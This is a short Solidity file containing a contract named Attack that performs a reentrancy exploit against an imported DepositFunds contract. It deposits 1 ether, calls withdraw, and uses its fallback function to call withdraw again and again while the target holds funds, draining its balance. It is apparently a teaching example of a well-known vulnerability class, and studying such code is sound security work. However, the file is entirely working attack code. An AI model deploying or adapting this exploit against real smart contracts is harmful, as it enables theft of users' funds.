// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
 import "./DepositFunds.sol";

contract Attack {
    fundDeposit public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = fundDeposit(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }
}    























